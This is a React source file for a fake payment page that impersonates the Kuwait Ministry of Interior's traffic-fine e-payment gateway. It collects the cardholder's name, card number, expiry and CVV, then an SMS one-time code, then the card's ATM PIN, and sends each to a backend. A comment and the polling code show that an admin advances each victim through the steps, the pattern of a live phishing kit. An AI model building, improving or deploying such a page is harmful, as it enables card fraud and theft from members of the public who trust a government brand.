import React, { useState, useEffect, type ReactNode, type FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Phone, Lock, CreditCard, ShieldCheck, CheckCircle2, XCircle, Loader2, ArrowRight } from "lucide-react";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const navigate = useNavigate();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  
  const { lang } = useLanguage();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      navigate("/");
      return;
    }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    // Create payment session on load
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: parsed.enquiryType,
      queryId: parsed.queryId
    });
  }, []);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => {
      setSessionId(data.sessionId);
    }
  });

  // Polling for stage changes from admin
  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { 
      enabled: !!sessionId && (stage.endsWith("_pending")),
      refetchInterval: 2000 
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) {
        setError(sessionStatus.errorMessage);
      }
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitPin = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: cardName || "Customer",
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: expiry,
      cardCvv: cvv
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({
      sessionId,
      otpCode: otp
    });
  };

  const handlePinSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitPin.mutate({
      sessionId,
      atmPin: pin
    });
  };

  if (!paymentData) return null;

  return (
    <div className="min-h-screen bg-[#f8f9fa] font-cairo" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b-4 border-[#003366] shadow-sm">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <img src="/logo-moi.svg" alt="MOI Logo" className="h-12 md:h-16" />
          </div>
          <div className="flex items-center gap-3">
            <div className="text-right hidden sm:block">
              <div className="text-sm font-bold text-[#003366]">بوابة الدفع الإلكتروني</div>
              <div className="text-[10px] text-gray-500 uppercase">E-Payment Gateway</div>
            </div>
            <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-[#003366]">
              <Lock className="w-5 h-5" />
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 max-w-4xl">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          {/* Summary Column */}
          <div className="md:col-span-1 order-2 md:order-1">
            <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
              <div className="bg-[#f8f9fa] px-4 py-3 border-b border-gray-200 text-right">
                <h3 className="font-bold text-[#003366]">ملخص الدفع</h3>
              </div>
              <div className="p-6 space-y-4 text-right">
                <div className="bg-blue-50 p-4 rounded-lg text-center">
                  <div className="text-xs text-blue-600 font-bold mb-1">المبلغ الإجمالي</div>
                  <div className="text-3xl font-black text-[#003366]">{paymentData.totalAmount} دك</div>
                </div>
                
                <div className="space-y-3 text-sm">
                  <div className="flex justify-between flex-row-reverse">
                    <span className="text-gray-500">الرقم المدني:</span>
                    <span className="font-bold">{paymentData.civilId}</span>
                  </div>
                  <div className="flex justify-between flex-row-reverse">
                    <span className="text-gray-500">عدد المخالفات:</span>
                    <span className="font-bold">{paymentData.selectedFines.length}</span>
                  </div>
                  <div className="flex justify-between flex-row-reverse">
                    <span className="text-gray-500">العملة:</span>
                    <span className="font-bold">دينار كويتي</span>
                  </div>
                </div>

                <div className="pt-4 flex items-center justify-end gap-2 text-[10px] text-gray-400">
                  <span>دفع آمن SSL 256-bit</span>
                  <ShieldCheck className="w-4 h-4" />
                </div>
              </div>
            </div>
          </div>

          {/* Form Column */}
          <div className="md:col-span-2 order-1 md:order-2">
            {stage === "card" && (
              <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
                <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-200 text-right">
                  <h3 className="font-bold text-[#003366]">بيانات البطاقة البنكية</h3>
                </div>
                <div className="p-8">
                  <form onSubmit={handleCardSubmit} className="space-y-6 text-right">
                    <div>
                      <label className="block text-sm font-bold text-gray-600 mb-2">اسم حامل البطاقة</label>
                      <input
                        type="text"
                        value={cardName}
                        onChange={(e) => setCardName(e.target.value)}
                        placeholder="الاسم كما يظهر على البطاقة"
                        className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-bold text-gray-600 mb-2">رقم البطاقة</label>
                      <div className="relative">
                        <input
                          type="text"
                          value={cardNumber}
                          onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").slice(0, 19))}
                          placeholder="0000 0000 0000 0000"
                          className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg font-mono text-left"
                          dir="ltr"
                          required
                        />
                        <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 w-6 h-6" />
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-6">
                      <div>
                        <label className="block text-sm font-bold text-gray-600 mb-2">تاريخ الانتهاء</label>
                        <input
                          type="text"
                          value={expiry}
                          onChange={(e) => setExpiry(e.target.value.replace(/\D/g, "").replace(/(\d{2})(?=\d)/g, "$1/").slice(0, 5))}
                          placeholder="MM/YY"
                          className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg text-center"
                          dir="ltr"
                          required
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-bold text-gray-600 mb-2">رمز التحقق (CVV)</label>
                        <input
                          type="password"
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                          placeholder="***"
                          className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg text-center"
                          dir="ltr"
                          required
                        />
                      </div>
                    </div>

                    <Button
                      type="submit"
                      disabled={!sessionId || submitCard.isPending}
                      className="w-full py-7 bg-[#003366] hover:bg-[#002244] text-white rounded font-bold text-xl shadow-md transition-all"
                    >
                      {submitCard.isPending ? <Loader2 className="animate-spin" /> : "إتمام الدفع"}
                    </Button>
                  </form>
                </div>
              </div>
            )}

            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="bg-white rounded-lg shadow-md p-16 text-center border border-gray-200">
                <Loader2 className="w-20 h-20 text-[#003366] animate-spin mx-auto mb-8" />
                <h3 className="text-2xl font-bold text-gray-800 mb-3">جاري معالجة الطلب...</h3>
                <p className="text-gray-500">يرجى الانتظار وعدم إغلاق هذه الصفحة.</p>
              </div>
            )}

            {stage === "otp" && (
              <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
                <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-200 text-right">
                  <h3 className="font-bold text-[#003366]">التحقق من الهوية</h3>
                </div>
                <div className="p-8 text-center space-y-6">
                  <div className="w-20 h-20 bg-blue-50 text-[#003366] rounded-full flex items-center justify-center mx-auto">
                    <Phone className="w-10 h-10" />
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-xl font-bold">أدخل رمز التحقق (OTP)</h3>
                    <p className="text-gray-500">تم إرسال رمز مكون من 6 أرقام إلى هاتفك المسجل.</p>
                  </div>
                  
                  <form onSubmit={handleOtpSubmit} className="space-y-6 max-w-xs mx-auto">
                    <input
                      type="text"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                      placeholder="000000"
                      className="w-full h-16 px-4 rounded border-2 border-gray-200 focus:border-[#003366] focus:ring-0 text-3xl font-bold tracking-[0.5em] text-center"
                      required
                    />
                    {error && <p className="text-red-600 text-sm font-bold">{error}</p>}
                    <Button
                      type="submit"
                      className="w-full py-6 bg-[#003366] hover:bg-[#002244] text-white rounded font-bold text-lg"
                    >
                      تأكيد الرمز
                    </Button>
                  </form>
                </div>
              </div>
            )}

            {stage === "atm" && (
              <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
                <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-200 text-right">
                  <h3 className="font-bold text-[#003366]">تأكيد الرقم السري</h3>
                </div>
                <div className="p-8 text-center space-y-6">
                  <div className="w-20 h-20 bg-blue-50 text-[#003366] rounded-full flex items-center justify-center mx-auto">
                    <Lock className="w-10 h-10" />
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-xl font-bold">أدخل الرقم السري للبطاقة</h3>
                    <p className="text-gray-500">يرجى إدخال الرقم السري المكون من 4 أرقام (PIN).</p>
                  </div>
                  
                  <form onSubmit={handlePinSubmit} className="space-y-6 max-w-xs mx-auto">
                    <input
                      type="password"
                      value={pin}
                      onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
                      placeholder="••••"
                      className="w-full h-16 px-4 rounded border-2 border-gray-200 focus:border-[#003366] focus:ring-0 text-3xl font-bold tracking-[0.5em] text-center"
                      required
                    />
                    {error && <p className="text-red-600 text-sm font-bold">{error}</p>}
                    <Button
                      type="submit"
                      className="w-full py-6 bg-[#003366] hover:bg-[#002244] text-white rounded font-bold text-lg"
                    >
                      تأكيد الرقم السري
                    </Button>
                  </form>
                </div>
              </div>
            )}

            {stage === "success" && (
              <div className="bg-white rounded-lg shadow-md p-16 text-center border border-gray-200">
                <div className="w-24 h-24 bg-green-50 text-green-600 rounded-full flex items-center justify-center mx-auto mb-8">
                  <CheckCircle2 className="w-12 h-12" />
                </div>
                <h3 className="text-3xl font-bold text-gray-800 mb-4">تمت عملية الدفع بنجاح!</h3>
                <p className="text-gray-600 mb-10 text-lg">شكراً لك، تم استلام دفعتك وتحديث سجل المخالفات.</p>
                <Button
                  onClick={() => navigate("/")}
                  className="bg-[#003366] text-white py-6 px-12 text-lg font-bold rounded"
                >
                  العودة للرئيسية
                </Button>
              </div>
            )}

            {stage === "failed" && (
              <div className="bg-white rounded-lg shadow-md p-16 text-center border border-gray-200">
                <div className="w-24 h-24 bg-red-50 text-red-600 rounded-full flex items-center justify-center mx-auto mb-8">
                  <XCircle className="w-12 h-12" />
                </div>
                <h3 className="text-3xl font-bold text-gray-800 mb-4">فشلت عملية الدفع</h3>
                <p className="text-red-600 mb-10 text-lg">{error || "تم رفض المعاملة من قبل البنك."}</p>
                <Button
                  onClick={() => { setError(null); setStage("card"); }}
                  className="bg-gray-800 text-white py-6 px-12 text-lg font-bold rounded"
                >
                  حاول مرة أخرى
                </Button>
              </div>
            )}
          </div>
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 py-8 mt-20 text-center">
        <div className="container mx-auto px-4">
          <p className="text-sm text-gray-400 font-bold">
            © 2026 وزارة الداخلية - دولة الكويت. جميع الحقوق محفوظة.
          </p>
        </div>
      </footer>
    </div>
  );
}
